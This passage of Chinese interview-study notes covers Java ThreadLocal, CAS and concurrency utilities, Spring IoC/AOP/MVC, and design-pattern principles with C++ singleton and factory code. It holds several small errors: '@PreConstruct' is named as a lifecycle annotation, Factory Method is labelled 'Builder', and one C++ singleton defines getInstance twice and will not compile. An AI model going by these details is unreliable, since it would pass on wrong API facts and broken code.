**set 方法**

首先获取当前线程，然后再获取当前线程对应的 ThreadLocalMap 类型的对象 map。如果 map 存在就直接设置值，key 是当前的 ThreadLocal 对象，value 是传入的参数。

如果 map 不存在就通过 `createMap` 方法为当前线程创建一个 ThreadLocalMap 对象再设置值。

**get 方法**

首先获取当前线程，然后再获取当前线程对应的 ThreadLocalMap 类型的对象 map。如果 map 存在就以当前 ThreadLocal 对象作为 key 获取 Entry 类型的对象 e，如果 e 存在就返回它的 value 属性。

如果 e 不存在或者 map 不存在，就调用 `setInitialValue` 方法先为当前线程创建一个 ThreadLocalMap 对象然后返回默认的初始值 null。

**remove 方法**

首先通过当前线程获取其对应的 ThreadLocalMap 类型的对象 m，如果 m 不为空，就解除 ThreadLocal 这个 key 及其对应的 value 值的联系。

**存在的问题**

线程复用会产生脏数据，由于线程池会重用 Thread 对象，因此与 Thread 绑定的 ThreadLocal 也会被重用。如果没有调用 remove 清理与线程相关的 ThreadLocal 信息，那么假如下一个线程没有调用 set 设置初始值就可能 get 到重用的线程信息。

ThreadLocal 还存在内存泄漏的问题，由于 ThreadLocal 是弱引用，但 Entry 的 value 是强引用，因此当 ThreadLocal 被垃圾回收后，value 依旧不会被释放。因此需要及时调用 remove 方法进行清理操作。

### 什么是CAS？

CAS 表示 Compare And Swap，比较并交换，CAS 需要三个操作数，分别是内存位置 V、旧的预期值 A 和准备设置的新值 B。CAS 指令执行时，当且仅当 V 符合 A 时，处理器才会用 B 更新 V 的值，否则它就不执行更新。但不管是否更新都会返回 V 的旧值，这些处理过程是原子操作，执行期间不会被其他线程打断。

在 JDK 5 后，Java 类库中才开始使用 CAS 操作，该操作由 Unsafe 类里的 `compareAndSwapInt` 等几个方法包装提供。HotSpot 在内部对这些方法做了特殊处理，即时编译的结果是一条平台相关的处理器 CAS 指令。Unsafe 类不是给用户程序调用的类，因此 JDK9 前只有 Java 类库可以使用 CAS，譬如 juc 包里的 AtomicInteger类中 `compareAndSet` 等方法都使用了Unsafe 类的 CAS 操作实现。

### CAS 有什么问题？

CAS 从语义上来说存在一个逻辑漏洞：如果 V 初次读取时是 A，并且在准备赋值时仍为 A，这依旧不能说明它没有被其他线程更改过，因为这段时间内假设它的值先改为 B 又改回 A，那么 CAS 操作就会误认为它从来没有被改变过。

这个漏洞称为 ABA 问题，juc 包提供了一个 AtomicStampedReference，原子更新带有版本号的引用类型，通过控制变量值的版本来解决 ABA 问题。大部分情况下 ABA 不会影响程序并发的正确性，如果需要解决，传统的互斥同步可能会比原子类更高效。

### 有哪些原子类？

JDK 5 提供了 java.util.concurrent.atomic 包，这个包中的原子操作类提供了一种用法简单、性能高效、线程安全地更新一个变量的方式。到 JDK 8 该包共有17个类，依据作用分为四种：原子更新基本类型类、原子更新数组类、原子更新引用类以及原子更新字段类，atomic 包里的类基本都是使用 Unsafe 实现的包装类。

AtomicInteger 原子更新整形、 AtomicLong 原子更新长整型、AtomicBoolean 原子更新布尔类型。

AtomicIntegerArray，原子更新整形数组里的元素、 AtomicLongArray 原子更新长整型数组里的元素、 AtomicReferenceArray 原子更新引用类型数组里的元素。

AtomicReference 原子更新引用类型、AtomicMarkableReference 原子更新带有标记位的引用类型，可以绑定一个 boolean 标记、 AtomicStampedReference 原子更新带有版本号的引用类型，关联一个整数值作为版本号，解决 ABA 问题。

AtomicIntegerFieldUpdater 原子更新整形字段的更新器、 AtomicLongFieldUpdater 原子更新长整形字段的更新器AtomicReferenceFieldUpdater 原子更新引用类型字段的更新器。

### AtomicIntger 实现原子更新的原理是什么？

AtomicInteger 原子更新整形、 AtomicLong 原子更新长整型、AtomicBoolean 原子更新布尔类型。

`getAndIncrement` 以原子方式将当前的值加 1，首先在 for 死循环中取得 AtomicInteger 里存储的数值，第二步对 AtomicInteger 当前的值加 1 ，第三步调用 `compareAndSet` 方法进行原子更新，先检查当前数值是否等于 expect，如果等于则说明当前值没有被其他线程修改，则将值更新为 next，否则会更新失败返回 false，程序会进入 for 循环重新进行 `compareAndSet` 操作。

atomic 包中只提供了三种基本类型的原子更新，atomic 包里的类基本都是使用 Unsafe 实现的，Unsafe 只提供三种 CAS 方法：`compareAndSwapInt`、`compareAndSwapLong` 和 `compareAndSwapObject`，例如原子更新 Boolean 是先转成整形再使用 `compareAndSwapInt` 。

### CountDownLatch 是什么？

CountDownLatch 是基于执行时间的同步类，允许一个或多个线程等待其他线程完成操作，构造方法接收一个 int 参数作为计数器，如果要等待 n 个点就传入 n。每次调用 `countDown` 方法时计数器减 1，`await` 方***阻塞当前线程直到计数器变为0，由于 `countDown` 方法可用在任何地方，所以 n 个点既可以是 n 个线程也可以是一个线程里的 n 个执行步骤。

### CyclicBarrier 是什么？

循环屏障是基于同步到达某个点的信号量触发机制，作用是让一组线程到达一个屏障时被阻塞，直到最后一个线程到达屏障才会解除。构造方法中的参数表示拦截线程数量，每个线程调用 `await` 方法告诉 CyclicBarrier 自己已到达屏障，然后被阻塞。还支持在构造方法中传入一个 Runnable 任务，当线程到达屏障时会优先执行该任务。适用于多线程计算数据，最后合并计算结果的应用场景。

CountDownLacth 的计数器只能用一次，而 CyclicBarrier 的计数器可使用 `reset` 方法重置，所以 CyclicBarrier 能处理更为复杂的业务场景，例如计算错误时可用重置计数器重新计算。

### Semaphore 是什么？

信号量用来控制同时访问特定资源的线程数量，通过协调各个线程以保证合理使用公共资源。信号量可以用于流量控制，特别是公共资源有限的应用场景，比如数据库连接。

Semaphore 的构造方法参数接收一个 int 值，表示可用的许可数量即最大并发数。使用 `acquire` 方法获得一个许可证，使用 `release` 方法归还许可，还可以用 `tryAcquire` 尝试获得许可。

### Exchanger 是什么？

交换者是用于线程间协作的工具类，用于进行线程间的数据交换。它提供一个同步点，在这个同步点两个线程可以交换彼此的数据。

两个线程通过 `exchange` 方法交换数据，第一个线程执行 `exchange` 方法后会阻塞等待第二个线程执行该方法，当两个线程都到达同步点时这两个线程就可以交换数据，将本线程生产出的数据传递给对方。应用场景包括遗传[算法]()、校对工作等。

## 框架

### IOC是什么

IoC 即控制反转，简单来说就是把原来代码里需要实现的对象创建、依赖反转给容器来帮忙实现，需要创建一个容器并且需要一种描述让容器知道要创建的对象间的关系，在 Spring 中管理对象及其依赖关系是通过 Spring 的 IoC 容器实现的。

IoC 的实现方式有依赖注入和依赖查找，由于依赖查找使用的很少，因此 IoC 也叫做依赖注入。依赖注入指对象被动地接受依赖类而不用自己主动去找，对象不是从容器中查找它依赖的类，而是在容器实例化对象时主动将它依赖的类注入给它。假设一个 Car 类需要一个 Engine 的对象，那么一般需要需要手动 new 一个 Engine，利用 IoC 就只需要定义一个私有的 Engine 类型的成员变量，容器会在运行时自动创建一个 Engine 的实例对象并将引用自动注入给成员变量。

### IoC 容器初始化过程？

**基于 XML 的容器初始化**

当创建一个 ClassPathXmlApplicationContext 时，构造方法做了两件事：① 调用父容器的构造方法为容器设置好 Bean 资源加载器。② 调用父类的 `setConfigLocations` 方法设置 Bean 配置信息的定位路径。

ClassPathXmlApplicationContext 通过调用父类 AbstractApplicationContext 的 `refresh` 方法启动整个 IoC 容器对 Bean 定义的载入过程，`refresh` 是一个模板方法，规定了 IoC 容器的启动流程。在创建 IoC 容器前如果已有容器存在，需要把已有的容器销毁，保证在 `refresh` 方法后使用的是新创建的 IoC 容器。

容器创建后通过 `loadBeanDefinitions` 方法加载 Bean 配置资源，该方法做两件事：① 调用资源加载器的方法获取要加载的资源。② 真正执行加载功能，由子类 XmlBeanDefinitionReader 实现。加载资源时首先解析配置文件路径，读取配置文件的内容，然后通过 XML 解析器将 Bean 配置信息转换成文档对象，之后按照 Spring Bean 的定义规则对文档对象进行解析。

Spring IoC 容器中注册解析的 Bean 信息存放在一个 HashMap 集合中，key 是字符串，值是 BeanDefinition，注册过程中需要使用 synchronized 保证线程安全。当配置信息中配置的 Bean 被解析且被注册到 IoC 容器中后，初始化就算真正完成了，Bean 定义信息已经可以使用且可被检索。Spring IoC 容器的作用就是对这些注册的 Bean 定义信息进行处理和维护，注册的 Bean 定义信息是控制反转和依赖注入的基础。

**基于注解的容器初始化**

分为两种：① 直接将注解 Bean 注册到容器中，可以在初始化容器时注册，也可以在容器创建之后手动注册，然后刷新容器使其对注册的注解 Bean 进行处理。② 通过扫描指定的包及其子包的所有类处理，在初始化注解容器时指定要自动扫描的路径。

### 依赖注入的实现方法有哪些？

**构造方法注入：** IoC Service Provider 会检查被注入对象的构造方法，取得它所需要的依赖对象列表，进而为其注入相应的对象。这种方法的优点是在对象构造完成后就处于就绪状态，可以马上使用。缺点是当依赖对象较多时，构造方法的参数列表会比较长，构造方法无法被继承，无法设置默认值。对于非必需的依赖处理可能需要引入多个构造方法，参数数量的变动可能会造成维护的困难。

**setter 方法注入：** 当前对象只需要为其依赖对象对应的属性添加 setter 方法，就可以通过 setter 方法将依赖对象注入到被依赖对象中。setter 方法注入在描述性上要比构造方法注入强，并且可以被继承，允许设置默认值。缺点是无法在对象构造完成后马上进入就绪状态。

**接口注入：** 必须实现某个接口，接口提供方法来为其注入依赖对象。使用少，因为它强制要求被注入对象实现不必要接口，侵入性强。

### 依赖注入的相关注解？

`@Autowired`：自动按类型注入，如果有多个匹配则按照指定 Bean 的 id 查找，查找不到会报错。

`@Qualifier`：在自动按照类型注入的基础上再按照 Bean 的 id 注入，给变量注入时必须搭配 `@Autowired`，给方法注入时可单独使用。

`@Resource` ：直接按照 Bean 的 id 注入，只能注入 Bean 类型。

`@Value` ：用于注入基本数据类型和 String 类型。

### 依赖注入的过程？

`getBean` 方法获取 Bean 实例，该方***调用 `doGetBean` ，`doGetBean` 真正实现从 IoC 容器获取 Bean 的功能，也是触发依赖注入的地方。

具体创建 Bean 对象的过程由 ObjectFactory 的 `createBean` 完成，该方法主要通过 `createBeanInstance` 方法生成 Bean 包含的 Java 对象实例和 `populateBean` 方法对 Bean 属性的依赖注入进行处理。

在 `populateBean`方法中，注入过程主要分为两种情况：① 属性值类型不需要强制转换时，不需要解析属性值，直接进行依赖注入。② 属性值类型需要强制转换时，首先解析属性值，然后对解析后的属性值进行依赖注入。依赖注入的过程就是将 Bean 对象实例设置到它所依赖的 Bean 对象属性上，真正的依赖注入是通过 `setPropertyValues` 方法实现的，该方法使用了委派模式。

BeanWrapperImpl 类负责对完成初始化的 Bean 对象进行依赖注入，对于非集合类型属性，使用 JDK 反射，通过属性的 setter 方法为属性设置注入后的值。对于集合类型的属性，将属性值解析为目标类型的集合后直接赋值给属性。

当容器对 Bean 的定位、载入、解析和依赖注入全部完成后就不再需要手动创建对象，IoC 容器会自动为我们创建对象并且注入依赖。

### Bean 的生命周期？

在 IoC 容器的初始化过程中会对 Bean 定义完成资源定位，加载读取配置并解析，最后将解析的 Bean 信息放在一个 HashMap 集合中。当 IoC 容器初始化完成后，会进行对 Bean 实例的创建和依赖注入过程，注入对象依赖的各种属性值，在初始化时可以指定自定义的初始化方法。经过这一系列初始化操作后 Bean 达到可用状态，接下来就可以使用 Bean 了，当使用完成后会调用 destroy 方法进行销毁，此时也可以指定自定义的销毁方法，最终 Bean 被销毁且从容器中移除。

XML 方式通过配置 bean 标签中的 init-Method 和 destory-Method 指定自定义初始化和销毁方法。 

注解方式通过 `@PreConstruct` 和 `@PostConstruct` 注解指定自定义初始化和销毁方法。

### Bean 的作用范围？

通过 scope 属性指定 bean 的作用范围，包括：

① singleton：单例模式，是默认作用域，不管收到多少 Bean 请求每个容器中只有一个唯一的 Bean 实例。

② prototype：原型模式，和 singleton 相反，每次 Bean 请求都会创建一个新的实例。

③ request：每次 HTTP 请求都会创建一个新的 Bean 并把它放到 request 域中，在请求完成后 Bean 会失效并被垃圾收集器回收。

④ session：和 request 类似，确保每个 session 中有一个 Bean 实例，session 过期后 bean 会随之失效。

⑤ global session：当应用部署在 Portlet 容器时，如果想让所有 Portlet 共用全局存储变量，那么该变量需要存储在 global session 中。

### 如何通过 XML 方式创建 Bean？

默认无参构造方法，只需要指明 bean 标签中的 id 和 class 属性，如果没有无参构造方***报错。

静态工厂方法，通过 bean 标签中的 class 属性指明静态工厂，factory-method 属性指明静态工厂方法。

实例工厂方法，通过 bean 标签中的 factory-bean 属性指明实例工厂，factory-method 属性指明实例工厂方法。

### 如何通过注解创建 Bean？

`@Component` 把当前类对象存入 Spring 容器中，相当于在 xml 中配置一个 bean 标签。value 属性指定 bean 的 id，默认使用当前类的首字母小写的类名。

`@Controller`，`@Service`，`@Repository` 三个注解都是 `@Component` 的衍生注解，作用及属性都是一模一样的。只是提供了更加明确语义，`@Controller` 用于表现层，`@Service`用于业务层，`@Repository`用于持久层。如果注解中有且只有一个 value 属性要赋值时可以省略 value。

如果想将第三方的类变成组件又没有源代码，也就没办法使用 `@Component` 进行自动配置，这种时候就要使用 `@Bean` 注解。被 `@Bean` 注解的方法返回值是一个对象，将会实例化，配置和初始化一个新对象并返回，这个对象由 Spring 的 IoC 容器管理。name 属性用于给当前 `@Bean` 注解方法创建的对象指定一个名称，即 bean 的 id。当使用注解配置方法时，如果方法有参数，Spring 会去容器查找是否有可用 bean对象，查找方式和 `@Autowired` 一样。

### 如何通过注解配置文件？

`@Configuration` 用于指定当前类是一个 spring 配置类，当创建容器时会从该类上加载注解，value 属性用于指定配置类的字节码。

`@ComponentScan` 用于指定 Spring 在初始化容器时要扫描的包。basePackages 属性用于指定要扫描的包。

`@PropertySource` 用于加载 `.properties` 文件中的配置。value 属性用于指定文件位置，如果是在类路径下需要加上 classpath。

`@Import` 用于导入其他配置类，在引入其他配置类时可以不用再写 `@Configuration` 注解。有 `@Import` 的是父配置类，引入的是子配置类。value 属性用于指定其他配置类的字节码。

### BeanFactory、FactoryBean 和 ApplicationContext 的区别？

BeanFactory 是一个 Bean 工厂，使用简单工厂模式，是 Spring IoC 容器顶级接口，可以理解为含有 Bean 集合的工厂类，作用是管理 Bean，包括实例化、定位、配置对象及建立这些对象间的依赖。BeanFactory 实例化后并不会自动实例化 Bean，只有当 Bean 被使用时才实例化与装配依赖关系，属于延迟加载，适合多例模式。

FactoryBean 是一个工厂 Bean，使用了工厂方法模式，作用是生产其他 Bean 实例，可以通过实现该接口，提供一个工厂方法来自定义实例化 Bean 的逻辑。FactoryBean 接口由 BeanFactory 中配置的对象实现，这些对象本身就是用于创建对象的工厂，如果一个 Bean 实现了这个接口，那么它就是创建对象的工厂 Bean，而不是 Bean 实例本身。

ApplicationConext 是 BeanFactory 的子接口，扩展了 BeanFactory 的功能，提供了支持国际化的文本消息，统一的资源文件读取方式，事件传播以及应用层的特别配置等。容器会在初始化时对配置的 Bean 进行预实例化，Bean 的依赖注入在容器初始化时就已经完成，属于立即加载，适合单例模式，一般推荐使用。

### AOP 是什么？

AOP 即面向切面编程，简单地说就是将代码中重复的部分抽取出来，在需要执行的时候使用动态代理技术，在不修改源码的基础上对方法进行增强。

Spring 根据类是否实现接口来判断动态代理方式，如果实现接口会使用 JDK 的动态代理，核心是 InvocationHandler 接口和 Proxy 类，如果没有实现接口会使用 CGLib 动态代理，CGLib 是在运行时动态生成某个类的子类，如果某个类被标记为 final，不能使用 CGLib 。

JDK 动态代理主要通过重组字节码实现，首先获得被代理对象的引用和所有接口，生成新的类必须实现被代理类的所有接口，动态生成Java 代码后编译新生成的 `.class` 文件并重新加载到 JVM 运行。JDK 代理直接写 Class 字节码，CGLib 是采用 ASM 框架写字节码，生成代理类的效率低。但是 CGLib 调用方法的效率高，因为 JDK 使用反射调用方法，CGLib 使用 FastClass 机制为代理类和被代理类各生成一个类，这个类会为代理类或被代理类的方法生成一个 index，这个 index 可以作为参数直接定位要调用的方法。

常用场景包括权限认证、自动缓存、错误处理、日志、调试和事务等。

### AOP 的相关注解有哪些？

`@Aspect`：声明被注解的类是一个切面 Bean。

`@Before`：前置通知，指在某个连接点之前执行的通知。

`@After`：后置通知，指某个连接点退出时执行的通知（不论正常返回还是异常退出）。

`@AfterReturning`：返回后通知，指某连接点正常完成之后执行的通知，返回值使用returning属性接收。

`@AfterThrowing`：异常通知，指方法抛出异常导致退出时执行的通知，和`@AfterReturning`只会有一个执行，异常使用throwing属性接收。

### AOP 的过程？

Spring AOP 由 BeanPostProcessor 后置处理器开始，这个后置处理器是一个***，可以监听容器触发的 Bean 生命周期事件，向容器注册后置处理器以后，容器中管理的 Bean 就具备了接收 IoC 容器回调事件的能力。BeanPostProcessor 的调用发生在 Spring IoC 容器完成 Bean 实例对象的创建和属性的依赖注入后，为 Bean 对象添加后置处理器的入口是 `initializeBean` 方法。

Spring 中 JDK 动态代理通过 JdkDynamicAopProxy 调用 Proxy 的 `newInstance` 方法来生成代理类，JdkDynamicAopProxy 也实现了 InvocationHandler 接口，`invoke` 方法的具体逻辑是先获取应用到此方法上的拦截器链，如果有拦截器则创建 MethodInvocation 并调用其 `proceed` 方法，否则直接反射调用目标方法。因此 Spring AOP 对目标对象的增强是通过拦截器实现的。

### Spring MVC 的处理流程？

Web 容器启动时会通知 Spring 初始化容器，加载 Bean 的定义信息并初始化所有单例 Bean，然后遍历容器中的 Bean，获取每一个 Controller 中的所有方法访问的 URL，将 URL 和对应的 Controller 保存到一个 Map 集合中。

所有的请求会转发给 DispatcherServlet 前端处理器处理，DispatcherServlet 会请求 HandlerMapping 找出容器中被 `@Controler` 注解修饰的 Bean 以及被 `@RequestMapping` 修饰的方法和类，生成 Handler 和 HandlerInterceptor 并以一个 HandlerExcutionChain 处理器执行链的形式返回。

之后 DispatcherServlet 使用 Handler 找到对应的 HandlerApapter，通过 HandlerApapter 调用 Handler 的方法，将请求参数绑定到方法的形参上，执行方法处理请求并得到 ModelAndView。

最后 DispatcherServlet 根据使用 ViewResolver 试图解析器对得到的 ModelAndView 逻辑视图进行解析得到 View 物理视图，然后对视图渲染，将数据填充到视图中并返回给客户端。

### Spring MVC 有哪些组件？

`DispatcherServlet`：SpringMVC 中的前端控制器，是整个流程控制的核心，负责接收请求并转发给对应的处理组件。

`Handler`：处理器，完成具体业务逻辑，相当于 Servlet 或 Action。

`HandlerMapping`：完成 URL 到 Controller 映射，DispatcherServlet 通过 HandlerMapping 将不同请求映射到不同 Handler。

`HandlerInterceptor`：处理器拦截器，是一个接口，如果需要完成一些拦截处理，可以实现该接口。

`HandlerExecutionChain`：处理器执行链，包括两部分内容：Handler 和 HandlerInterceptor。

`HandlerAdapter`：处理器适配器，Handler执行业务方法前需要进行一系列操作，包括表单数据验证、数据类型转换、将表单数据封装到JavaBean等，这些操作都由 HandlerAdapter 完成。DispatcherServlet 通过 HandlerAdapter 来执行不同的 Handler。

`ModelAndView`：装载模型数据和视图信息，作为 Handler 处理结果返回给 DispatcherServlet。

`ViewResolver`：视图解析器，DispatcherServlet 通过它将逻辑视图解析为物理视图，最终将渲染的结果响应给客户端。

### Spring MVC 的相关注解？

`@Controller`：在类定义处添加，将类交给IoC容器管理。

`@RequtestMapping`：将URL请求和业务方法映射起来，在类和方法定义上都可以添加该注解。`value` 属性指定URL请求的实际地址，是默认值。`method` 属性限制请求的方法类型，包括GET、POST、PUT、DELETE等。如果没有使用指定的请求方法请求URL，会报405 Method Not Allowed 错误。`params` 属性限制必须提供的参数，如果没有会报错。

`@RequestParam`：如果 Controller 方法的形参和 URL 参数名一致可以不添加注解，如果不一致可以使用该注解绑定。`value` 属性表示HTTP请求中的参数名。`required` 属性设置参数是否必要，默认false。`defaultValue` 属性指定没有给参数赋值时的默认值。

`@PathVariable`：Spring MVC 支持 RESTful 风格 URL，通过 `@PathVariable` 完成请求参数与形参的绑定。

# 设计模式

设计模式（Design Pattern）代表了最佳实践。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决问题。

设计模式是一套被反复使用的、多人知晓的、经过分类编目的、代码设计经验的总结。

使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。

设计模式是软件设计中常见问题的典型解决方案。每个模式就像一张蓝图，可以通过对齐进行定制来解决代码中的特定设计问题。

## 设计模式六大原则

### 单一职责（Single Responsibility Principle）

类的职责要单一，不能将太多的职责放在一个类中。

### 开闭原则（Open Close Principle）

**对扩展开放，对修改关闭。**在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类。

### 里氏代换原则（Liskov Substitution Principle）

是面向对象设计的基本原则之一。该原则说，任何基类可以出现的地方，子类一定可以出现。LSP是继承复用的基石，只有派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤是抽象化，而基类和子类的继承关系就是抽象化的具体实现，所以里氏代换原则是**对实现抽象化的具体步骤的规范**。

### 依赖倒转原则（Dependence Inversion Principle）

这个原则是开闭原则的基础，具体内容为：**针对接口编程，依赖于抽象而不依赖于具体**。

### 接口隔离原则（Interface Segregation Principle）

使用多个隔离的接口，比使用单个接口更好。即降低类之间的耦合度。

### 迪米特法则（Demeter Principle）：最少知道原则

一个实体应当尽量少的与其他实体之间发生相互作用，使得系统功能模块相对独立。

### 合成复用原则（Composite Reuse Principle）

尽量使用合成/聚合的方式，而不是使用继承。

## 创建型模式

### 单例模式（Singleton）

单例模式是一种创建型设计模式，**能够保证一个类只有一个实例，并提供一个访问该实例的全局节点**。

#### 解决的问题

**1，保证一个类只有一个实例**。最常见的原因是控制某些共享资源的访问权限。

**2，为该实例提供一个全局访问节点**。和全局变量一样，单例模式也允许在程序的任何地方访问特定对象。但是他可以保护该实例不被其他代码覆盖。

#### 解决方案

所有实例的实现都包含以下两个相同的步骤：

- 将默认构造函数设置为私有，防止其他对象使用单例类的`new`运算符
- 新建一个静态构造方法作为构造函数。该函数会“偷偷”调用私有构造函数来创建对象，并将其保存在一个静态成员变量中。此后所有该函数的调用都将返回这一缓存对象。

如果代码能够访问单例类，那他就能调用单例类的静态方法。无论何时调用该方法，他总是能够返回相同的对象。

#### 单例模式结构

单例（Singleton）类声明一个名为`getInstance`获取实例的静态方法来返回其所属类的一个相同实例。

单例的构造方法必须对客户端代码隐藏，调用获取实例方法必须是获取单例对象的唯一方式。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\singleton.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- 如果程序中的某个类对于所有客户端只有一个可用的实例，可以使用单例模式。
  - 单例模式禁止通过除特殊构建方法以外的任何方式来创建自身类的对象。 该方法可以创建一个新对象， 但如果该对象已经被创建， 则返回已有的对象。
- 如果需要更加严格的控制全局变量，可以使用单例模式。
  - 单例模式与全局变量不同， 它保证类只存在一个实例。 除了单例类自己以外， 无法通过任何方式替换缓存的实例。
- 注意：可以随时调整限制并设定生成单例实例的数量， 只需修改 `获取实例`方法， 即 getInstance 中的代码即可实现。

#### 实现方式

- 在类中添加一个私有静态成员变量用户保存单例实例。
- 声明一个公有静态构建方法用于获取单例实例。
- 在静态方法中实现“延迟初始化”。该方法会在首次被调用时创建一个新对象，并将其存储在静态成员变量中。此后该方法每次被调用时都返回该实例。
- 将类的构造函数设置为私有。类的静态方法仍能调用构造函数，但是其他对象不能调用。
- 检查客户端代码，将对单例的构造函数的调用替换为对其静态构造方法的调用。

#### 代码实现

```c++
// 懒汉式，线程不安全
class Singleton{
public:
	static Singleton* getInstance(){}
private:
	Singleton(){}
	static Singleton *singleton;
};
Singleton* Singleton::singleton = NULL;
Singleton* Singleton::getInstance(){
    if(singleton == NULL)
        singleton = new Singleton();
    return singleton;
}

// 懒汉式，线程安全
#include <mutex>
class Singleton {
private:
    Singleton() {}
    static Singleton* singleton;
    static pthread_mutex_t mutex;
public:
    static Singleton* getInstance();
};
pthread_mutex_t Singleton::mutex = PTHREAD_MUTEX_INITIALIZER;
Singleton* Singleton::singleton = NULL;
Singleton* Singleton::getInstance(){
    if(singleton == NULL){ 
        pthread_mutex_lock(&mutex);
        if(singleton == NULL)
            singleton = new Singleton();
        pthread_mutex_unlock(&mutex);
    }
    return singleton;
}

// 饿汉式，线程安全，初始就创建一个实例
class Singleton{
private:
    Singleton (){}
    static Singleton* singleton;
public:
    static Singleton* getInstance(){
        return singleton;
    }
};
Singleton* Singleton::singleton = new Singleton();
```

#### 优缺点

**优点：**

- 可以保证一个类只有一个实例
- 获得了一个指向该实例的全局访问节点
- 仅在首次请求实例对象时对齐初始化

**缺点：**

- 违反了**单一职责原则**。该模式同时解决了两个问题。
- 单例模式可能掩盖不良设计，比如程序各组件之间相互了解过多等
- 该模式在多线程环境下需要进行特殊处理，避免多个线程多次创建单例对象。
- 到哪里的客户端代码单元测试可能比较困难，因为许多测试框架以基于继承的方式创建模拟对象。 由于单例类的构造函数是私有的， 而且绝大部分语言无法重写静态方法， 所以你需要想出仔细考虑模拟单例的方法。 要么干脆不编写测试代码， 或者不使用单例模式。

### 工厂方法模式（Builder）

**工厂方法模式**是一种创建型设计模式， 其在父类中提供一个创建对象的方法， 允许子类决定实例化对象的类型。

#### 解决方案

工厂方法模式建议使用特殊的工厂方法代替对于对象构造函数的直接调用（即使用new运算符）。

但是需要注意：仅当这些产品具有共同的基类或者接口时，子类才能返回不同类型的产品。同时基类中的工厂方法还应将其返回类型声明为这一共有接口。

调用工厂方法的代码（通常被视为客户端代码）无需了解不同子类返回实际对象之间的差别。客户端将所有产品视为抽象的`运输`。客户端都知道所有运输对象都提供`交付`方法，但是并不关心其具体实现方式。

#### 工厂方法模式结构

- **产品（Product）**：将会对接口进行声明。对于所有由创建者及其子类构建的对象。这些接口都是通用的。
- **具体产品（Concrete Product）**：产品接口的不同实现。
- **创建者（Creator）**：类声明返回产品对象的工厂方法。该方法的返回对象类型必须与产品接口相匹配。
  - 主要职责并不是创建产品。一般来说，创建者类包含一些与产品相关的核心业务逻辑。工厂方法将这些逻辑处理从具体产品类中分离出来。
- **具体创建者（Concrete Creator）**：将会重写基础工厂方法，使其返回不同类型的产品。注意并不一定每次调用工厂方法都会创建新的实例。工厂方法也可以返回缓存、对象池或者其他来源的已有对象。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\factory.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **在编写代码的过程中，如果无法预知对象确切类别及其依赖关系时，可以使用工厂方法。**
  - 工厂方法将创建产品的代码与实际使用产品的代码分离， 从而能在不影响其他代码的情况下扩展产品创建部分代码。
  - 例如， 如果需要向应用中添加一种新产品， 你只需要开发新的创建者子类， 然后重写其工厂方法即可。
- **如果你希望用户能扩展你软件库或框架的内部组件，可使用工厂方法**。
  - 解决方案是将各框架中构造组件的代码集中到单个工厂方法中， 并在继承该组件之外允许任何人对该方法进行重写。
- **如果你希望复用现有对象来节省系统资源，而不是每次都重新创建对象，可使用工厂方法**。

#### 实现方法

- 让所有产品都遵循同一接口。 该接口必须声明对所有产品都有意义的方法。
- 在创建类中添加一个空的工厂方法。 该方法的返回类型必须遵循通用的产品接口。
- 在创建者代码中找到对于产品构造函数的所有引用。 将它们依次替换为对于工厂方法的调用， 同时将创建产品的代码移入工厂方法。 你可能需要在工厂方法中添加临时参数来控制返回的产品类型。
- 为工厂方法中的每种产品编写一个创建者子类， 然后在子类中重写工厂方法， 并将基本方法中的相关创建代码移动到工厂方法中。
- 如果应用中的产品类型太多， 那么为每个产品创建子类并无太大必要， 这时你也可以在子类中复用基类中的控制参数。
- 如果代码经过上述移动后， 基础工厂方法中已经没有任何代码， 你可以将其转变为抽象类。 如果基础工厂方法中还有其他语句， 你可以将其设置为该方法的默认行为。

#### 代码实现

例子：生产处理器的厂商，一个工厂生产处理器A，一个生产处理器B

```c++
class Core{
public:
	virutal void show() = 0;
};
// 处理器A
class CoreA: public Core{
public:
	void show(){cout << "Core A" << endl;}
};
// 处理器B
class CoreB: public Core{
public:
	void show(){cout << "Core B" << endl;}
};
class Factory{
public:
	virtual Core* CreateCore() = 0;
};
// 生产处理器A的工厂
class FactoryA: Factory{
public:
	CoreA* CreateCore(){return new CoreA;}
};
// 生产处理器B的工厂
class FactoryB: Factory{
public:
	CoreB* CreateCore(){return new CoreB;}
};
```

#### 优缺点

优点：

- 可以避免创建者和具体产品之间的紧密耦合。
- *单一职责原则*。 你可以将产品创建代码放在程序的单一位置， 从而使得代码更容易维护。
- *开闭原则*。 无需更改现有客户端代码， 你就可以在程序中引入新的产品类型。

缺点：

-  应用工厂方法模式需要引入许多新的子类， 代码可能会因此变得更复杂。 最好的情况是将该模式引入创建者类的现有层次结构中。

### 抽象工厂模式（Abstract Factory）

**抽象工厂模式**是一种创建型设计模式， 它能创建一系列相关的对象， 而无需指定其具体类。

#### 解决方案

抽象工厂模式建议为系列中的每件产品明确声明接口 （例如椅子、 沙发或咖啡桌）。 然后， 确保所有产品变体都继承这些接口。 例如， 所有风格的椅子都实现 `椅子`接口； 所有风格的咖啡桌都实现 `咖啡桌`接口， 以此类推。

#### 抽象工厂模式结构

- **抽象产品（Abstract Product）**：为构成系列产品的一组不同但相关的产品声明接口。
- **具体产品（Concrete Product）**：是抽象产品的多种不同类型实现。所有变体都必须实现对应的抽象产品。
- **抽象工厂（Abstract Factory）**：接口声明了一组创建各种抽象产品的方法
- **具体工厂（Concrete Factory）**：实现抽象工厂的构建方法。每个具体工厂都对应特定产品变体，且仅 创建此种产品实体。
- 尽管具体工厂会对具体产品进行初始化， 其构建方法签名必须返回相应的*抽象*产品。 这样， 使用工厂类的客户端代码就不会与工厂创建的特定产品变体耦合。 **客户端** （Client） 只需通过抽象接口调用工厂和产品对象， 就能与任何具体工厂/产品变体交互。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\abstractfactory.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

